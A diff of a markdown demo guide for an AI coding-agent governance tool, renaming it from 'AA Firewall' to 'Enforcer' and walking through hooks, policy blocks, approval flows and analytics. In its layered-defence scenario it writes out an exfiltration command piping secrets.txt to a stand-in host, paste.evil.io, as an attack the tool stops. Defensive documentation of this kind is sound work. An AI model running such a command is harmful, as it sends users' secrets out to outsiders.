@@ -1,8 +1,8 @@
 > Author: Deepankar Das
 
-# AA Firewall — Product Demo
+# Enforcer — Product Demo
 
-> A step-by-step showcase of AA Firewall governing an AI coding agent in real time.
+> A step-by-step showcase of Enforcer governing an AI coding agent in real time.
 > Duration: ~20 minutes. Audience: Security leads, platform engineers, CISOs.
 
 ---
@@ -18,7 +18,7 @@ Optional cleanup flag for repeat demos:
 
 ## Architecture Overview
 
-In production, AA Firewall runs on **two different physical machines**:
+In production, Enforcer runs on **two different physical machines**:
 
 ### Management Hub (security team server)
 
@@ -114,17 +114,17 @@ Developer interaction on Machine A:
 
 7. **Every action is logged** — allowed, denied, approval decisions, enrichment events, anomaly alerts, enforcement state changes, policy modifications. Nothing is silent. Even when enforcement is disabled, actions are logged with `ENFORCEMENT_DISABLED` reason.
 
-8. **OS kernel enforcement interface (Phase 2)** — the `KernelEnforcer` interface defines how AA Firewall will intercept `file.open`, `execve`, and `connect` syscalls at the kernel level (eBPF on Linux, Endpoint Security Framework on macOS). The interface, types, and integration path are built. A `StubEnforcer` implements the interface and logs every invocation. The real eBPF/ESF module that actually blocks syscalls is planned for Phase 2.
+8. **OS kernel enforcement interface (Phase 2)** — the `KernelEnforcer` interface defines how Enforcer will intercept `file.open`, `execve`, and `connect` syscalls at the kernel level (eBPF on Linux, Endpoint Security Framework on macOS). The interface, types, and integration path are built. A `StubEnforcer` implements the interface and logs every invocation. The real eBPF/ESF module that actually blocks syscalls is planned for Phase 2.
 
 9. **Enterprise analytics reduces admin cognitive load** — instead of reviewing thousands of individual events, the admin sees: stack-ranked blocked operations with trends, 10 auto-classified developer groups (Power Builder, Boundary Tester, Automation Driver, etc.), a friction heatmap showing which policies cause the most pain for which groups, and one-click policy recommendations with impact estimates. Each developer gets a personal awareness scorecard with compliance score, contextual tips, and weekly digests.
 
-> **Critical: Governance is always on.** In enterprise deployment, the security team pushes AA Firewall to developer machines via MDM (Jamf, Intune, Ansible). The developer never installs anything. When they open VS Code, Claude Code reads the managed settings file (`/Library/Application Support/ClaudeCode/managed-settings.json` with `allowManagedHooksOnly=true`) and governance activates automatically. The developer cannot disable enforcement, remove hooks, kill the daemon, modify policies, or bypass the firewall via raw terminal. Every layer is tamper-resistant: managed hooks prevent removal, the daemon runs as root and auto-restarts, admin tokens are required for any configuration change, and OS kernel enforcement (Phase 2) will block unauthorized syscalls at the kernel level.
+> **Critical: Governance is always on.** In enterprise deployment, the security team pushes Enforcer to developer machines via MDM (Jamf, Intune, Ansible). The developer never installs anything. When they open VS Code, Claude Code reads the managed settings file (`/Library/Application Support/ClaudeCode/managed-settings.json` with `allowManagedHooksOnly=true`) and governance activates automatically. The developer cannot disable enforcement, remove hooks, kill the daemon, modify policies, or bypass the firewall via raw terminal. Every layer is tamper-resistant: managed hooks prevent removal, the daemon runs as root and auto-restarts, admin tokens are required for any configuration change, and OS kernel enforcement (Phase 2) will block unauthorized syscalls at the kernel level.
 
 ---
 
 ## Setup (One-time, 3 minutes)
 
-> **Prerequisite:** Follow [AA_Firewall_SETUP.md](./AA_Firewall_SETUP.md) first (prerequisites, deployment modes, and seed-auth options). Run this demo only after setup is complete.
+> **Prerequisite:** Follow [Enforcer_SETUP.md](./Enforcer_SETUP.md) first (prerequisites, deployment modes, and seed-auth options). Run this demo only after setup is complete.
 
 ### One-Machine Demo (Developer Is Admin)
 
@@ -197,7 +197,7 @@ After deployment, confirm that governance hooks are enforced and the daemon is r
 Expected output:
 ```
 [ENFORCED]  Managed hooks active (allowManagedHooksOnly=true)
-[OK]        Hook binary: /usr/local/bin/aafirewall-hook
+[OK]        Hook binary: /usr/local/bin/enforcer-hook
 [OK]        Sentinel daemon running on port 9100
 ```
 
@@ -243,7 +243,7 @@ curl -s -X POST http://localhost:9100/v1/evaluate \
 
 **What Claude Code sees:**
 ```
-[AA Firewall] BLOCKED: Write outside the project directory is blocked by organization policy.
+[Enforcer] BLOCKED: Write outside the project directory is blocked by organization policy.
 Policy: org.block_non_project_writes
 Reason: PATH_OUTSIDE_PROJECT_ROOT
 ```
@@ -321,7 +321,7 @@ Developer asks Claude Code: "rm -rf node_modules"
     v  Daemon creates pending approval, returns approval_id
     |
     v  Hook exits 2 IMMEDIATELY with message:
-    |   "[AA Firewall] APPROVAL REQUIRED: Destructive command requires approval.
+    |   "[Enforcer] APPROVAL REQUIRED: Destructive command requires approval.
     |    Policy: org.approve_destructive_commands
     |    Request ID: apr_xxx
     |    An approval request has been sent to your security admin.
@@ -397,7 +397,7 @@ Instead of the Hub Console, the admin can resolve approvals via the API:
 APPROVAL_ID="apr_demo-006_..."  # Replace with actual ID
 
 # Get the admin token
-TOKEN=$(cat /tmp/aa-firewall-admin-token 2>/dev/null || echo "your-admin-token")
+TOKEN=$(cat /tmp/enforcer-admin-token 2>/dev/null || echo "your-admin-token")
 
 # Approve
 curl -s -X POST "http://localhost:9100/v1/approvals/$APPROVAL_ID/resolve" \
@@ -434,7 +434,7 @@ curl -s http://localhost:9100/v1/enforcement | python3 -m json.tool
 ### 3.2 Disable enforcement (admin only)
 
 ```bash
-TOKEN=$(cat /tmp/aa-firewall-admin-token 2>/dev/null || echo "your-admin-token")
+TOKEN=$(cat /tmp/enforcer-admin-token 2>/dev/null || echo "your-admin-token")
 
 curl -s -X POST http://localhost:9100/v1/enforcement/toggle \
   -H "Content-Type: application/json" \
@@ -511,7 +511,7 @@ Enterprise mode requires policy changes through the Management Hub only.
 ### 4.3 Fetch the active Hub policy bundle
 
 ```bash
-TOKEN=$(cat /tmp/aa-firewall-admin-token 2>/dev/null || echo "adm1")
+TOKEN=$(cat /tmp/enforcer-admin-token 2>/dev/null || echo "adm1")
 
 curl -s http://localhost:9201/api/v1/policy \
   -H "X-Admin-Token: $TOKEN" | python3 -m json.tool
@@ -629,13 +629,13 @@ Open http://localhost:9201 and navigate through:
 Expected output:
 ```
 [ENFORCED]  Managed hooks active (allowManagedHooksOnly=true)
-[OK]        Hook binary: /usr/local/bin/aafirewall-hook
+[OK]        Hook binary: /usr/local/bin/enforcer-hook
 [OK]        Sentinel daemon running on port 9100
 ```
 
 If hooks are not active, redeploy. For VS Code, reload the window (Cmd+Shift+P → "Developer: Reload Window"). For CLI, restart `claude`.
 
-> **The developer cannot override or disable AA Firewall.** The hooks are managed — the developer cannot remove them from their settings. The daemon runs as a system service — the developer cannot kill it. The admin token is not available to the developer — they cannot toggle enforcement.
+> **The developer cannot override or disable Enforcer.** The hooks are managed — the developer cannot remove them from their settings. The daemon runs as a system service — the developer cannot kill it. The admin token is not available to the developer — they cannot toggle enforcement.
 
 ### 6.2 Test: Safe action passes silently
 
@@ -647,12 +647,12 @@ Ask Claude Code: *"Read the README.md file and summarize it."*
 
 ### 6.3 Test: Blocked — deleting a file outside the project
 
-> **Important:** These tests use dummy files you create specifically for the demo. Do NOT use real sensitive files (SSH keys, credentials, etc.) for testing. If you want to experiment with real files later, back them up first — AA Firewall will block the delete, but it's good practice to have backups before any security testing.
+> **Important:** These tests use dummy files you create specifically for the demo. Do NOT use real sensitive files (SSH keys, credentials, etc.) for testing. If you want to experiment with real files later, back them up first — Enforcer will block the delete, but it's good practice to have backups before any security testing.
 
 **Setup:** Open a terminal and create a dummy test file in your home directory:
 
 ```bash
-echo "this is a dummy test file for the AA Firewall demo" > ~/secrets_outside.txt
+echo "this is a dummy test file for the Enforcer demo" > ~/secrets_outside.txt
 ```
 
 **Run the test:** Ask Claude Code: *"Delete the file ~/secrets_outside.txt"*
@@ -685,7 +685,7 @@ This test shows the full approval workflow: the developer's action is paused, th
 **Setup:** Create a dummy test file inside the project:
 
 ```bash
-echo "this is a dummy test file for the AA Firewall demo" > secrets_inside.txt
+echo "this is a dummy test file for the Enforcer demo" > secrets_inside.txt
 ```
 
 **Step 1 — Ask Claude Code to delete it:** *"Delete the file secrets_inside.txt"*
@@ -717,7 +717,7 @@ Click **Approve**.
 **Step 4 — Verify one-time approval:** Recreate the file and ask Claude Code to delete it again:
 
 ```bash
-echo "this is a dummy test file for the AA Firewall demo" > secrets_inside.txt
+echo "this is a dummy test file for the Enforcer demo" > secrets_inside.txt
 ```
 
 Ask Claude Code: *"Delete the file secrets_inside.txt"*
@@ -729,7 +729,7 @@ Ask Claude Code: *"Delete the file secrets_inside.txt"*
 The tests above exercise this enforcement pipeline:
 
 1. Claude Code calls a tool (Read, Write, Bash, etc.)
-2. The `PreToolUse` managed hook fires — calls `/usr/local/bin/aafirewall-hook pre_tool_call`
+2. The `PreToolUse` managed hook fires — calls `/usr/local/bin/enforcer-hook pre_tool_call`
 3. The hook handler sends the action to the Sentinel daemon at `http://localhost:9100/v1/evaluate`
 4. The daemon evaluates the action against the policy bundle (13 rules)
 5. The daemon returns one of: `allow` (hook exits 0), `deny` (hook exits 2), or `require_approval` (hook exits 2 with approval request)
@@ -806,7 +806,7 @@ flowchart LR
    Claude Code fires PreToolUse for WebFetch tool.
    Hook handler sends POST /v1/evaluate to daemon.
    Daemon checks: paste.evil.io NOT in allowlist → DENY.
-   Hook exits 2. Claude Code sees: "[AA Firewall] BLOCKED."
+   Hook exits 2. Claude Code sees: "[Enforcer] BLOCKED."
    ✓ Stopped at Layer 1.
 
 3. Developer opens raw terminal: "curl https://paste.evil.io < secrets.txt"
@@ -1011,13 +1011,13 @@ The `StubEnforcer` implements this interface today. A real `EbpfEnforcer` (Linux
 
 ```bash
 # Run in enforce mode (deny blocked actions)
-AA_OSGUARD_MODE=enforce ./go/bin/aafirewall-daemon
+AA_OSGUARD_MODE=enforce ./go/bin/enforcer-daemon
 
 # Run in audit mode (log but don't block — safe for rollout)
-AA_OSGUARD_MODE=audit ./go/bin/aafirewall-daemon
+AA_OSGUARD_MODE=audit ./go/bin/enforcer-daemon
 
 # Disabled (no kernel enforcement)
-AA_OSGUARD_MODE=off ./go/bin/aafirewall-daemon
+AA_OSGUARD_MODE=off ./go/bin/enforcer-daemon
 ```
 
 In audit mode, the stub logs `"log_only": true` — the decision is computed but not enforced. This allows safe rollout of the real kernel module: deploy in audit mode, verify no false positives in the invocation log, then switch to enforce mode.
@@ -1100,7 +1100,7 @@ The developer sees:
 ### 9.3 Query the analytics API directly
 
 ```bash
-TOKEN=$(cat /tmp/aa-firewall-admin-token 2>/dev/null || echo "your-admin-token")
+TOKEN=$(cat /tmp/enforcer-admin-token 2>/dev/null || echo "your-admin-token")
 
 # Stack-ranked blocked operations (last 7 days)
 curl -s "http://localhost:9201/api/v1/analytics/blocked-operations?period=7d" \
